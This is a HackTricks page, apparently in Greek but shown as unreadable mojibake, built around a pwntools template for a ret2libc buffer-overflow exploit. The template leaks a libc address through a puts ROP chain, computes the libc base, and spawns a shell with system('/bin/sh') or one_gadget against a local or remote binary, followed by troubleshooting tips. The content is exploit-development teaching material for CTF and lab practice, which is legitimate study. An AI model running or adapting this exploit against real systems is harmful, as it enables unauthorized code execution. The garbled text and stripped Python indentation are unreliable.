# Î”Î¹Î±ÏÏÎ¿Î® libc - Ï€ÏÏŒÏ„Ï…Ï€Î¿

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% code title="template.py" %}
```python
from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools


###################
### CONNECTION ####
###################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False
USE_ONE_GADGET = False

LOCAL_BIN = "./vuln"
REMOTE_BIN = "~/vuln" #For ssh
LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}

if LOCAL:
P = process(LOCAL_BIN, env=ENV) # start the vuln binary
ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
P = remote('10.10.10.10',1339) # start the vuln binary
ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
elf = ELF(LOCAL_BIN)# Extract data from binary
rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
# attach gdb and continue
# You can set breakpoints, for example "break *main"
gdb.attach(P.pid, "b *main")



#########################
#### OFFSET FINDER ######
#########################

OFFSET = b"" #b"A"*264
if OFFSET == b"":
gdb.attach(P.pid, "c") #Attach and continue
payload = cyclic(264)
payload += b"AAAAAAAA"
print(P.clean())
P.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#print(cyclic_find(0x63616171)) # Find the offset of those bytes
P.interactive()
exit()



####################
### Find Gadgets ###
####################
try:
libc_func = "puts"
PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
except:
libc_func = "printf"
PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))


########################
### Find LIBC offset ###
########################

def generate_payload_aligned(rop):
payload1 = OFFSET + rop
if (len(payload1) % 16) == 0:
return payload1

else:
payload2 = OFFSET + p64(RET) + rop
if (len(payload2) % 16) == 0:
log.info("Payload aligned successfully")
return payload2
else:
log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
return payload1


def get_addr(libc_func):
FUNC_GOT = ELF_LOADED.got[libc_func]
log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
rop1 = generate_payload_aligned(rop1)

# Send our rop-chain payload
#P.sendlineafter("dah?", rop1) #Use this to send the payload when something is received
print(P.clean()) # clean socket buffer (read all and print)
P.sendline(rop1)

# If binary is echoing back the payload, remove that message
recieved = P.recvline().strip()
if OFFSET[:30] in recieved:
recieved = P.recvline().strip()

# Parse leaked address
log.info(f"Len rop1: {len(rop1)}")
leak = u64(recieved.ljust(8, b"\x00"))
log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")

# Set lib base address
if LIBC:
LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
log.info("LIBC base @ %s" % hex(LIBC.address))

# If not LIBC yet, stop here
else:
print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
P.interactive()

return hex(leak)

get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base



#############################
#### FINAL EXPLOITATION #####
#############################

## Via One_gadget (https://github.com/david942j/one_gadget)
# gem install one_gadget
def get_one_gadgets(libc):
import string, subprocess
args = ["one_gadget", "-r"]
if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
args += ["-b", libc.hex()]
else:
args += [libc]
try:
one_gadgets = [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
except:
print("One_gadget isn't installed")
one_gadgets = []
return

rop2 = b""
if USE_ONE_GADGET:
one_gadgets = get_one_gadgets(LIBC)
if one_gadgets:
rop2 = p64(one_gadgets[0]) + "\x00"*100 #Usually this will fullfit the constrains

## Normal/Long exploitation
if not rop2:
BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = LIBC.sym["system"]
EXIT = LIBC.sym["exit"]

log.info("POP_RDI %s " % hex(POP_RDI))
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
rop2 = generate_payload_aligned(rop2)


print(P.clean())
P.sendline(rop2)

P.interactive() #Interact with your shell :)
```
{% endcode %}

## Î£Ï…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î± Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î±

### MAIN_PLT = elf.symbols\['main'] Î´ÎµÎ½ Î²ÏÎ­Î¸Î·ÎºÎµ

Î‘Î½ Ï„Î¿ ÏƒÏÎ¼Î²Î¿Î»Î¿ "main" Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ (Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… ÏŒÏ„Î¹ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î³Î¹Î± Î­Î½Î± Î±Ï€Î¿Î³Ï…Î¼Î½Ï‰Î¼Î­Î½Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿). Î¤ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î±Ï€Î»Î¬ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î¿Ï Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î¿Ï… main:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ÎºÎ±Î¹ Î¿ÏÎ¯ÏƒÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î±:
```python
MAIN_PLT = 0x401080
```
### Î— ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Puts Î´ÎµÎ½ Î²ÏÎ­Î¸Î·ÎºÎµ

Î‘Î½ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Puts, Ï€ÏÎ­Ï€ÎµÎ¹ **Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯**

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Î‘Î½ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ **ÏƒÏ†Î¬Î»Î¼Î±** Î¼ÎµÏ„Î¬ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± **ÏŒÎ»Î¿Ï…** Ï„Î¿Ï… exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Î ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± **Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÏ„Îµ 64 bytes Î±Ï€ÏŒ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
